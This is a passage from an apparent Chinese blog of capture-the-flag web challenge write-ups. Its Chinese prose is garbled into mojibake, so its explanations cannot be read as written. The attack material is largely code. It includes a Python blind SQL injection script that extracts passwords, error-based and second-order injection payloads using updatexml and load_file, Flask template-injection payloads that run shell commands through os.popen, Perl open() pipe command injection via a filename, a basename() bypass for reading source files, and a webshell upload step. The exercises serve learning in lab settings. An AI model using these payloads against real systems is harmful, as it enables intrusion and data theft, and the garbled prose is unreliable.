for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;
    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);
&#125;
echo $str;
?&gt;</code></pre>

<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921134936468.png" alt="image-20210921134936468"></p>
<p>åæ§½ä¸€ä¸‹ï¼Œå·¥ä¸šäº’è”ç½‘çš„æ—¶å€™çœ‹è§ä¸€ä¸ªç±»ä¼¼çš„é¢˜ï¼Œç…§ç€è¿™ä¸ªé¢˜çš„wpæ²¡è·‘å‡ºæ¥ï¼Œä»Šå¤©æ‰çŸ¥é“æ˜¯php_mt_seedçš„é—®é¢˜ï¼Œè™½ç„¶æ„Ÿè§‰å¾ˆç¦»è°±</p>
<p>å®˜ç½‘ä¸‹çš„çˆ†ä¸å‡ºseedï¼Œä»è¿™é‡Œä¸‹çš„å¯ä»¥<a target="_blank" rel="noopener" href="https://download.openwall.net/pub/projects/php_mt_seed/">Index of /pub/projects/php_mt_seed (openwall.net)</a></p>
<p>è¿˜æœ‰å°±æ˜¯ä¸€æ ·çš„ç§å­åœ¨phpç‰ˆæœ¬ä¸ä¸€æ ·çš„æ—¶å€™å‡ºæ¥çš„å€¼ä¹Ÿä¸ä¸€æ ·</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210921135243406.png" alt="image-20210921135243406"></p>
<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><pre class="language-none"><code class="language-none">&lt;?php
include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php

if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
&#125;

if (isset($_GET[&#39;source&#39;])) &#123;
  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
  exit();
&#125;

$secret &#x3D; bin2hex(random_bytes(64));
if (isset($_POST[&#39;guess&#39;])) &#123;
  $guess &#x3D; (string) $_POST[&#39;guess&#39;];
  if (hash_equals($secret, $guess)) &#123;
    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;
  &#125; else &#123;
    $message &#x3D; &#39;Wrong.&#39;;
  &#125;
&#125;
?&gt;
&lt;!doctype html&gt;
&lt;html lang&#x3D;&quot;en&quot;&gt;
  &lt;head&gt;
    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
    &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt;
  &lt;&#x2F;head&gt;
  &lt;body&gt;
    &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt;
    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt;
    &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
    &lt;hr&gt;
&lt;?php if (isset($message)) &#123; ?&gt;
    &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;
&lt;?php &#125; ?&gt;
    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;
      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt;
      &lt;input type&#x3D;&quot;submit&quot;&gt;
    &lt;&#x2F;form&gt;
  &lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;</code></pre>

<p>è¿™é‡Œæˆ‘æœ¬æ¥ä»¥ä¸ºæ˜¯phpä¼ªéšæœºæ•°çš„æ¼æ´ï¼Œç»“æœæœ€åæŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯basenameå‡½æ•°çš„æ¼æ´</p>
<p>å®ƒä¼šå¿½ç•¥åé¢çš„[\x80-\xff]èŒƒå›´å†…çš„å­—ç¬¦ä¸²ï¼Œå³éasciiå­—ç¬¦ã€‚ä¾‹å­å¦‚ä¸‹ï¼š</p>
<pre class="language-none"><code class="language-none">php -r &#39;print(basename(&quot;index.php&#x2F;config.php&#x2F;\x80&quot;));&#39; &#x2F;&#x2F; config.php
php -r &#39;print(basename(&quot;\x80index.php&#x2F;config.php&quot;));&#39; &#x2F;&#x2F; config.php</code></pre>

<p><strong>$_SERVER[â€˜PHP_SELFâ€™]è¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åï¼Œå½“ä½¿ç”¨äº†PATH_INFOæ—¶ï¼Œè¿™ä¸ªå€¼æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å¯ä»¥å°è¯•ç”¨/index.php/config.php?sourceæ¥è¯»å–flagã€‚</strong></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021163516849.png" alt="image-20211021163516849"></p>
<h2 id="CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb"><a href="#CISCN2019-æ€»å†³èµ›-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb"></a>[CISCN2019 æ€»å†³èµ› Day2 Web1]Easyweb</h2><p>æºç æ³„éœ²</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021165221385.png" alt="image-20211021165221385"></p>
<p>ä¸‹è½½image.php.bak</p>
<pre class="language-none"><code class="language-none">&lt;?php
include &quot;config.php&quot;;

$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;
$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;

$id&#x3D;addslashes($id);
$path&#x3D;addslashes($path);

$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);

$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or path&#x3D;&#39;&#123;$path&#125;&#39;&quot;);
$row&#x3D;mysqli_fetch_array($result,MYSQLI_ASSOC);

$path&#x3D;&quot;.&#x2F;&quot; . $row[&quot;path&quot;];
header(&quot;Content-Type: image&#x2F;jpeg&quot;);
readfile($path);</code></pre>

<p>GETæ–¹å¼ä¼ å…¥å˜é‡idçš„å€¼ï¼Œè‹¥æ²¡æœ‰åˆ™ä¸º1<br>GETæ–¹å¼ä¼ å…¥å˜é‡pathçš„å€¼ï¼Œè‹¥æ²¡æœ‰åˆ™ä¸ºç©º<br>addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼Œå•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œæ ï¼ˆ\ï¼‰<br>str_replace()å‡½æ•°å°†ä¸¤ä¸ªå˜é‡å†…çš„\0ã€%00ã€&#39;ã€&#39;éƒ½æ›¿æ¢ä¸ºç©º<br>å°†å˜é‡$idä¸$pathæ‹¼æ¥è¿›SQLè¯­å¥<br>è„šæœ¬ï¼š</p>
<pre class="language-none"><code class="language-none">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;f99fde09-be38-4b5a-bea6-2362fb4115e4.node4.buuoj.cn:81&#x2F;image.php?id&#x3D;\\0&#39;&amp;path&#x3D;&quot;

payload1 &#x3D; r&quot;or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; --+&quot;

payload2 &#x3D; r&quot;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;

payload3 &#x3D; r&quot;or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;

payload4 &#x3D; r&quot;or ascii(substr((select password from users),&#123;&#125;,1)) &gt; &#123;&#125; --+&quot;

database &#x3D; &quot;&quot;
for i in range(1,1000):
	low &#x3D; 32
	high &#x3D; 128
	mid &#x3D; (low + high) &#x2F;&#x2F; 2
	while(low &lt; high):
		payload &#x3D; payload4.format(i,mid)
		new_url &#x3D; url + payload
		r &#x3D; requests.get(new_url)
		if &quot;JFIF&quot; in r.text:
			low &#x3D; mid + 1
		else:
			high &#x3D; mid
		mid &#x3D; (low + high) &#x2F;&#x2F; 2
	if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 128):
		break
	database +&#x3D; chr(mid)
	print(database)</code></pre>

<p>å¾—åˆ°å¯†ç å’Œç”¨æˆ·åç™»å½•</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180732197.png" alt="image-20211021180732197"></p>
<p>ç™»å½•åæ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021180749445.png" alt="image-20211021180749445"></p>
<p>è¿™é‡Œè¦ç”¨æ–‡ä»¶åä¼ ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184513558.png" alt="image-20211021184513558"></p>
<p>åœ¨ä¸Šä¼ åçš„ç›®å½•å¯ä»¥çœ‹åˆ°ä¸Šä¼ çš„æ–‡ä»¶åä½†æ˜¯ä¸èƒ½è®¿é—®ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184345858.png" alt="image-20211021184345858"></p>
<p>ä¸èƒ½ç”¨phpå°±ç”¨çŸ­æ ‡ç­¾ä»£æ›¿</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184319466.png" alt="image-20211021184319466"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211021184415617.png" alt="image-20211021184415617"></p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p>ç¬¬ä¸€æ¬¡é‡è§äºŒæ¬¡æ³¨å…¥çš„é¢˜ï¼Œæ­£å¥½å­¦ä¸€ä¸‹</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026234512946.png" alt="image-20211026234512946"></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211026234523294.png" alt="image-20211026234523294"></p>
<p>æºç é‡Œæœ‰ä¸ªfileï¼ŒçŒœæµ‹æœ‰æ–‡ä»¶åŒ…å«ï¼Œå¯ä»¥åˆ©ç”¨ä¼ªåè®®è¯»å–è¿™å‡ ä¸ªé¡µé¢çš„æºç </p>
<p>change.phpé¡µé¢</p>
<pre class="language-sql" data-language="sql"><code class="language-sql">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
&#123;
    $msg &#x3D; &#39;&#39;;
    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;
    $user_name &#x3D; $_POST[&quot;user_name&quot;];
    $address &#x3D; addslashes($_POST[&quot;address&quot;]);
    $phone &#x3D; $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;
        $msg &#x3D; &#39;no sql inject!&#39;;
    &#125;else&#123;
        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;
        $fetch &#x3D; $db-&gt;query($sql);
    &#125;

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
        $row &#x3D; $fetch-&gt;fetch_assoc();
        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];
        $result &#x3D; $db-&gt;query($sql);
        if(!$result) &#123;
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        &#125;
        $msg &#x3D; &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;;
    &#125; else &#123;
        $msg &#x3D; &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;
    &#125;
&#125;else &#123;
    $msg &#x3D; &quot;ä¿¡æ¯ä¸å…¨&quot;;
&#125;</code></pre>

<p>ä¸»è¦çš„æ¼æ´ç‚¹å°±åœ¨change.php</p>
<p>å› ä¸ºå…¶ä»–è¾“å…¥ä½ç½®è¿‡æ»¤çš„å¤ªå¤šï¼ŒåŸºæœ¬èƒ½æ³¨å…¥çš„éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨address</p>
<p>åœ¨åˆ›å»ºaddressæ—¶è™½ç„¶å¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œäº†addslashesè¿‡æ»¤</p>
<p>ä½†ä¹‹åè¿˜ä¼šå¯¹æ—§addressè¿›è¡Œä¸€æ¬¡sqlæŸ¥è¯¢</p>
<p>å› æ­¤å¯ä»¥åˆ©ç”¨äºŒæ¬¡æ³¨å…¥ï¼Œå†ç»“åˆæŠ¥é”™æ³¨å…¥ï¼Œå’Œload_fileå‡½æ•°è¯»å–flagæ–‡ä»¶</p>
<p>åœ¨åˆ›å»ºæ—¶åœ¨åœ°å€ä¸­è¾“å…¥æ³¨å…¥è¯­å¥</p>
<p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</p>
<p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)#</p>
<p>ï¼ˆè¿™é‡Œä¹‹æ‰€ä»¥è¦çœ‹flag.txtæ ¹æ®å¸ˆå‚…ä»¬çš„åšå®¢æ¨æµ‹æ˜¯çº¯é çŒœçš„</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027000523555.png" alt="image-20211027000523555"></p>
<p>åœ¨ä¿®æ”¹åœ°å€çš„æ—¶å€™å°±ä¼šé‡æ–°è°ƒç”¨è¿™ä¸ªsqlè¯­å¥ï¼ŒæŠ¥é”™è¾“å‡ºflag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211027000543438.png" alt="image-20211027000543438"></p>
<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>ä¸€çœ¼sstiï¼Œç„¶åå°±ä¸ä¼šäº†ï¼ˆ</p>
<p>f12çœ‹åˆ°æºç æ³¨é‡Šï¼Œgetæ–¹å¼ï¼Œå‚æ•°ä¸ºsearch</p>
<p>è¯•ä¸€ä¸‹ä¼ 49ç¡®å®šæ˜¯ssti</p>
<pre class="language-none"><code class="language-none">config ä¹Ÿæ˜¯ Flaskæ¨¡ç‰ˆä¸­çš„ä¸€ä¸ªå…¨å±€å¯¹è±¡,å®ƒåŒ…å«äº†æ‰€æœ‰åº”ç”¨ç¨‹åºçš„é…ç½®å€¼ã€‚
&#123;&#123; config.items() &#125;&#125;    &#x2F;&#x2F; æŸ¥çœ‹é…ç½®é¡¹ç›®çš„ä¿¡æ¯  </code></pre>



<p>ä¾‹ä¸€ï¼š<br>warnings.catch_warningsç±»</p>
<pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</code></pre>

<p>PSï¼šç”±äºä½¿ç”¨[â€˜globalsâ€™]ä¼šé€ æˆ500çš„æœåŠ¡å™¨é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ä¸”å½“æˆ‘ç›´æ¥è¾“å…¥search=globalsæ—¶é¡µé¢ä¹Ÿä¼š500ï¼Œè§‰å¾—è¿™é‡Œåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥çš„å½¢å¼[â€˜gloâ€™+&#39;balsâ€™]</p>
<p>æœ€åè·å–flag</p>
<pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </code></pre>

<p>ä¾‹äºŒï¼š</p>
<pre class="language-none"><code class="language-none">classâ€™site._Printerâ€™ç±»

&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</code></pre>

<p>è·å–flag</p>
<pre class="language-none"><code class="language-none">&#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</code></pre>

<p>ä¾‹ä¸‰ï¼š<br>popen</p>
<pre class="language-none"><code class="language-none">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;
&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;ls &#x2F;flasklight&#39;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;
&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[258](&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&#39;,</code></pre>

<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>è¿™ä¹Ÿæ˜¯ä¸ªäºŒæ¬¡æ³¨å…¥</p>
<p>æ³¨å†Œåç™»å½•å†ä¿®æ”¹å¯†ç </p>
<p>åˆ©ç”¨æŠ¥é”™æ³¨å…¥</p>
<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028162141941.png" alt="image-20211028162141941"></p>
<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))#</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028162259138.png" alt="image-20211028162259138"></p>
<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))#</p>
<p>ç¦»è°±ï¼Œè¢«éª—äº†</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028163357632.png" alt="image-20211028163357632"></p>
<p>é‡æ–°æŸ¥è¡¨</p>
<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028170524356.png" alt="image-20211028170524356"></p>
<p>è¿™ä¸€çœ‹å°±æ˜¯æ²¡è¾“å‡ºå…¨</p>
<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))#</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028170804487.png" alt="image-20211028170804487"></p>
<p>ï¼Ÿï¼Ÿï¼Ÿ</p>
<p>è¿™ä¸ªå­—æ®µé‡ŒåŠ äº†ä¸€å †æ²¡ç”¨çš„æ•°æ®</p>
<p>åªèƒ½ç”¨æ­£åˆ™regexpè¿‡æ»¤ä¸€ä¸‹</p>
<p>ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)#</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028171620967.png" alt="image-20211028171620967"></p>
<p>è¿˜æ˜¯æ²¡è¾“å‡ºå…¨</p>
<p>ä¹‹åå°±è¦ç”¨é€†åºè¾“å‡ºäº†</p>
<p>ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)#</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211028171750860.png" alt="image-20211028171750860"></p>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>è¿›å»åæ˜¯phpä»£ç </p>
<p>ç›´æ¥æŠ„çš„å…¶ä»–å¸ˆå‚…çš„æ³¨é‡Š</p>
<pre class="language-none"><code class="language-none">&lt;?php
    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;
        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);  &#x2F;&#x2F; explode(separator,string)å‡½æ•°æŠŠä»¥separatorä¸ºåˆ†éš”å­—ç¬¦ä¸²å°†å­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚
        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];
    &#125;

    echo $_SERVER[&quot;REMOTE_ADDR&quot;];

    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);   &#x2F;&#x2F; â€œREMOTE_ADDRâ€ä¸ºæ­£åœ¨æµè§ˆå½“å‰é¡µé¢ç”¨æˆ·çš„ IP åœ°å€ã€‚ 
    @mkdir($sandbox);
    @chdir($sandbox);     &#x2F;&#x2F; æ”¹å˜å½“å‰çš„ç›®å½•åˆ°$sandbox

    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     &#x2F;&#x2F; escapeshellarg()æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°
    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);  &#x2F;&#x2F; pathinfo() å‡½æ•°ä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ã€‚
    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));   &#x2F;&#x2F; basename() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ã€‚
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info[&quot;basename&quot;]), $data);
    highlight_file(__FILE__);
    &#x2F;&#x2F; ä»¥ä¸Šä»£ç å¤§è‡´ä¸ºï¼Œè°ƒç”¨GETï¼ˆgitï¼‰å‘½ä»¤æ¥æ‰§è¡Œä»urlè·å–çš„å‚æ•°ï¼Œä»è¯¥urlè·å–å†…å®¹ï¼Œ ç„¶åæŒ‰ç…§filenameæ–°å»ºæ–‡ä»¶ï¼Œå†™å…¥gitåˆ°çš„ç»“æœã€‚</code></pre>

<p>ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨ä¼ å‚ä¸­çš„urlæ‰§è¡Œå‘½ä»¤ï¼Œç„¶åå°†ç»“æœä¿å­˜åœ¨filenameä¸­</p>
<p>æœ‰å‡ ä¸ªåœ°æ–¹ä¸å¤ªæ‡‚</p>
<p>â€‹    1.ç™¾åº¦çš„wpéƒ½è¯´è¿™é‡Œåˆ©ç”¨çš„perlè„šæœ¬é‡Œçš„openæ¼æ´</p>
<pre class="language-none"><code class="language-none">åˆ©ç”¨GETä¸­çš„openå‡½æ•°æ¼æ´ã€‚
openå‡½æ•°åœ¨GETå‘½ä»¤è¢«è°ƒç”¨æ—¶æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ç¬¬äº”è¡Œæ‰§è¡ŒGETå‘½ä»¤æ—¶ï¼Œperlè¯­è¨€ä¼šè°ƒç”¨openå‘½ä»¤ï¼Œæ¼æ´å°±å­˜åœ¨äºopenå‘½ä»¤å¯¹äºæ–‡ä»¶çš„å¤„ç†ä¸Šï¼Œå…³äºè¿™ä¸ªæ¼æ´ï¼Œå¤–å›½äººæœ‰æ–‡ç« ï¼Œæ˜¯è¿™æ ·å†™çš„ï¼šPerl saw that your â€œfileâ€ ended with a â€œpipeâ€ (vertical
bar) character. So it interpreted the â€œfileâ€ as a command to be executed, and interpreted the commandâ€™s output as the â€œfileâ€&#39;s contents. The command is â€œwhoâ€ (which prints information on currently logged-in users). If you execute that command, you will see that the output is exactly what the Perl program gave you.
ç¿»è¯‘è¿‡æ¥æ„æ€æ˜¯
perlå‡½æ•°çœ‹åˆ°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­å¦‚æœä»¥ç®¡é“ç¬¦ï¼ˆé”®ç›˜ä¸Šé‚£ä¸ªç«–æ ï¼‰ç»“å°¾ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶ä¸”å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœä½œä¸ºè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å†™å…¥ã€‚è¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œæƒé™æ˜¯å½“å‰çš„ç™»å½•è€…ã€‚å¦‚æœä½ æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ ä¼šçœ‹åˆ°perlç¨‹åºè¿è¡Œçš„ç»“æœã€‚</code></pre>

<p>â€‹    2.è¿™é‡Œæ‰§è¡Œurlä¼ å…¥çš„å‘½ä»¤çš„å‰ææ˜¯è¦æ±‚æœ‰ä¸ªä»¥è¯¥å‘½ä»¤å‘½åçš„æ–‡ä»¶</p>
<p>?url=/&amp;filename=1.txt çœ‹ä¸€ä¸‹æ ¹ç›®å½•</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205139421.png" alt="image-20211103205139421"></p>
<p>æœ‰ä¸¤ä¸ªå’Œflagæœ‰å…³çš„æ–‡ä»¶ï¼Œè¯•flagæ— æœï¼Œåªèƒ½è¯•è¯•readflag</p>
<p>?url=&amp;filename=bash -c /readflag|</p>
<p>å…ˆåˆ›å»ºä¸€ä¸ªbash -c /readflag|çš„æ–‡ä»¶</p>
<p>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</p>
<p>åˆ©ç”¨urlæ‰§è¡Œå‘½ä»¤</p>
<p>/sandbox/md5å€¼/bash -c /readflag|</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103205748482.png" alt="image-20211103205748482"></p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002530209.png" alt="image-20211115002530209"></p>
<p>jsonæ ¼å¼</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211115002559767.png" alt="image-20211115002559767"></p>
<p>cmd</p>
<p>å¯ä»¥çŒœåˆ°æ‰§è¡Œå‘½ä»¤æ ¼å¼æ˜¯</p>
<p>{&quot;cmd&quot;:&quot;ls&quot;}</p>
